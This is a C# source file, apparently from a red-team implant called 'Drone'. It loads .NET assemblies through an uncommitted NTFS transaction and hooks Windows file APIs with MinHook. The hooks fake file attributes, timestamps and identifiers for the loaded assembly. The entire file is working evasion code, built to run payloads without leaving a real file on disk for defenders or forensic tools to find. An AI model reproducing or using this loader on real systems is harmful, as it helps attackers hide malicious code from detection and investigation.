using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Linq;
using System.Text;

using Drone.Invocation.DynamicInvoke;

using MinHook;

namespace Drone
{
    public class TransactedAssembly
    {
        private string _assemblyName;
        private int _assemblyLength;
        
        private IntPtr _createFileHandle;
        
        private readonly byte[] _attributeData = new byte[36];
        private bool _attribDataSet = false;

        public Assembly Load(byte[] assemblyBytes)
        {
            _assemblyName = ParseArray(assemblyBytes);
            _assemblyLength = assemblyBytes.Length;

                var transactionHandle = Win32.Ktmw32.CreateTransaction(
                    IntPtr.Zero,
                    IntPtr.Zero,
                    0, 0, 0, 0,
                    new StringBuilder(Guid.NewGuid().ToShortGuid()));

                if (transactionHandle == IntPtr.Zero)
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                var path = $"{Environment.GetFolderPath(Environment.SpecialFolder.Desktop)}\\{Guid.NewGuid().ToShortGuid()}.tmp";

                ushort miniVersion = 0xffff;

                _createFileHandle = Win32.Kernel32.CreateFileTransactedW(
                    path,
                    0x80000000 | 0x40000000,
                    0x00000002,
                    IntPtr.Zero,
                    0x00000001,
                    0x100 | 0x04000000,
                    IntPtr.Zero,
                    transactionHandle,
                    ref miniVersion,
                    IntPtr.Zero);

                if (_createFileHandle.ToInt32() == -1)
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                uint bytesWritten = 0;
                if (!Win32.Kernel32.WriteFile(
                    _createFileHandle,
                    assemblyBytes,
                    (uint)assemblyBytes.Length,
                    ref bytesWritten,
                    IntPtr.Zero))
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                Assembly asm = null;
                
                using (var hookEngine = new HookEngine())
                {
                    hookEngine.CreateHook("Kernel32.dll", "GetFileAttributesW",
                        new Win32.Delegates.GetFileAttributesW(GetFileAttributesWDetour));
                    
                    hookEngine.CreateHook("Kernel32.dll", "GetFileAttributesExW",
                        new Win32.Delegates.GetFileAttributesExW(GetFileAttributesExWDetour));

                    hookEngine.CreateHook("Kernel32.dll", "CreateFileW",
                        new Win32.Delegates.CreateFileW(CreateFileWDetour));

                    hookEngine.CreateHook("Kernel32.dll", "GetFileInformationByHandle",
                        new Win32.Delegates.GetFileInformationByHandle(GetFileInformationByHandleDetour));
                    
                    hookEngine.EnableHooks();
                    
                    asm = Assembly.Load(_assemblyName.Substring(0, _assemblyName.Length - 4));
                }
                
            try
            {
                _attribDataSet = false;

                Win32.Kernel32.CloseHandle(_createFileHandle);
                Win32.Kernel32.CloseHandle(transactionHandle);
            }
            catch
            {
                // ignore
            }

            return asm;
        }

        private static string ParseArray(byte[] assemblyBytes)
        {
            var architecture = (int)BitConverter.ToUInt16(assemblyBytes, 152);

            int arrayPos;

            if (architecture == 523) // PE64
            {
                arrayPos = (int)BitConverter.ToUInt32(assemblyBytes, 520) - 7680;
            }
            else // PE32
            {
                arrayPos = (int)BitConverter.ToUInt32(assemblyBytes, 528) - 7680;
            }

            var metadataBaseAddress = arrayPos;
            arrayPos += 16;

            var currByte = assemblyBytes[arrayPos];

            while (currByte != 0x00)
            {
                arrayPos++;
                currByte = assemblyBytes[arrayPos];
            }

            arrayPos += 4;

            var streamNumber = (int)BitConverter.ToUInt16(assemblyBytes, arrayPos);

            arrayPos += 2;

            var allStreams = new List<StreamData>();

            for (var i = 0; i < streamNumber; i++)
            {
                var offset = (int)BitConverter.ToUInt32(assemblyBytes, arrayPos);
                var size = (int)BitConverter.ToUInt32(assemblyBytes, arrayPos + 4);

                arrayPos += 8;
                currByte = assemblyBytes[arrayPos];

                var stringStartPos = arrayPos;

                while (currByte != 0x00)
                {
                    arrayPos++;
                    currByte = assemblyBytes[arrayPos];
                }

                var singleStream = new StreamData(offset, size,
                    Encoding.ASCII.GetString(assemblyBytes, stringStartPos, arrayPos - stringStartPos));
                allStreams.Add(singleStream);

                arrayPos = arrayPos + 4 - arrayPos % 4;
            }

            var streamOffset = allStreams.FirstOrDefault(i => i.Name == "#~")!.Offset;
            streamOffset = streamOffset + 24 + metadataBaseAddress;

            var foundStringPointer = false;
            var dwordTestBytes = new byte[4];
            var stringOffset = 0;

            while (!foundStringPointer && streamOffset < assemblyBytes.Length - 4)
            {
                Array.Copy(assemblyBytes, streamOffset, dwordTestBytes, 0, 4);

                if (dwordTestBytes[0] == 0x00 && dwordTestBytes[1] == 0x00)
                {
                    var validationTestArray = new byte[6];
                    var validationTestBytes = new byte[] { 0x01, 0x00, 0x00, 0x00, 0x00, 0x00 };

                    Array.Copy(assemblyBytes, streamOffset + 4, validationTestArray, 0, 6);

                    if (validationTestArray.SequenceEqual(validationTestBytes))
                    {
                        foundStringPointer = true;
                        stringOffset = BitConverter.ToUInt16(dwordTestBytes, 2);
                    }
                }

                streamOffset += 4;
            }

            if (!foundStringPointer) return "";
            {
                var stringPos = allStreams.FirstOrDefault(i => i.Name == "#Strings")!.Offset + stringOffset +
                                metadataBaseAddress;
                var assemblyName = new List<byte>();
                var singleByte = assemblyBytes[stringPos];

                while (singleByte != 0x00)
                {
                    assemblyName.Add(singleByte);
                    stringPos += 1;
                    singleByte = assemblyBytes[stringPos];
                }

                return Encoding.ASCII.GetString(assemblyName.ToArray());
            }
        }

        private uint GetFileAttributesWDetour(IntPtr lpFileName)
        {
            var fileName = Marshal.PtrToStringUni(lpFileName);

            return fileName!.EndsWith(_assemblyName, StringComparison.OrdinalIgnoreCase)
                ? 32
                : Win32.KernelBase.GetFileAttributesW(lpFileName);
        }

        private bool GetFileAttributesExWDetour(IntPtr lpFileName, uint fInfoLevelId, IntPtr lpFileInformation)
        {
            var fileName = Marshal.PtrToStringUni(lpFileName);

            if (!fileName!.EndsWith(_assemblyName, StringComparison.OrdinalIgnoreCase))
                return Win32.KernelBase.GetFileAttributesExW(lpFileName, fInfoLevelId, ref lpFileInformation);
            
            if (!_attribDataSet)
            {
                var a = new Random();
                var creationTime = DateTime.Now.AddSeconds(a.Next(604800) * -1);

                BitConverter.GetBytes(0x00000020).CopyTo(_attributeData, 0);
                BitConverter.GetBytes(creationTime.ToFileTime()).CopyTo(_attributeData, 4);

                var t = DateTime.Now - creationTime;
                var writeTime = creationTime.AddSeconds(a.Next((int)t.TotalSeconds));

                BitConverter.GetBytes(writeTime.ToFileTime()).CopyTo(_attributeData, 20);

                t = DateTime.Now - writeTime;

                var modifiedTime = writeTime.AddSeconds(a.Next((int)t.TotalSeconds));

                BitConverter.GetBytes(modifiedTime.ToFileTime()).CopyTo(_attributeData, 12);
                BitConverter.GetBytes(0x00000000).CopyTo(_attributeData, 28);
                BitConverter.GetBytes(_assemblyLength).CopyTo(_attributeData, 32);
                Marshal.Copy(_attributeData, 0, lpFileInformation, 36);

                _attribDataSet = true;

                return true;
            }

            Marshal.Copy(_attributeData, 0, lpFileInformation, 36);
            return true;
        }

        private IntPtr CreateFileWDetour([MarshalAs(UnmanagedType.LPWStr)] string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile)
        {
            return lpFileName.EndsWith(_assemblyName, StringComparison.OrdinalIgnoreCase)
                ? _createFileHandle
                : Win32.KernelBase.CreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
        }

        private bool GetFileInformationByHandleDetour(IntPtr hFile, IntPtr lpFileInformation)
        {
            if (hFile != _createFileHandle)
                return Win32.KernelBase.GetFileInformationByHandle(hFile, ref lpFileInformation);
            
            var handleFileInfoData = new byte[52];

            Buffer.BlockCopy(_attributeData, 0, handleFileInfoData, 0, 28);
                
            var byteGenerator = new Random();
            var serialNumber = new byte[4];
            var fileFingerprint = new byte[8];
                
            byteGenerator.NextBytes(serialNumber);
            byteGenerator.NextBytes(fileFingerprint);
                
            fileFingerprint[0] = 0x00;
            fileFingerprint[1] = 0x00;
                
            Array.Copy(serialNumber, 0, handleFileInfoData, 28, 4);
            Buffer.BlockCopy(_attributeData, 28, handleFileInfoData, 32, 8);
            BitConverter.GetBytes(0x01).CopyTo(handleFileInfoData, 40);
            Array.Copy(fileFingerprint, 0, handleFileInfoData, 44, 8);
            Marshal.Copy(handleFileInfoData, 0, lpFileInformation, 52);
                
            return true;
        }
    }
    
    public class StreamData
    {
        public int Offset { get; }
        public int Size { get; }
        public string Name { get; }
        
        public StreamData(int offset, int size, string name)
        {
            Offset = offset;
            Size = size;
            Name = name;
        }
    }
}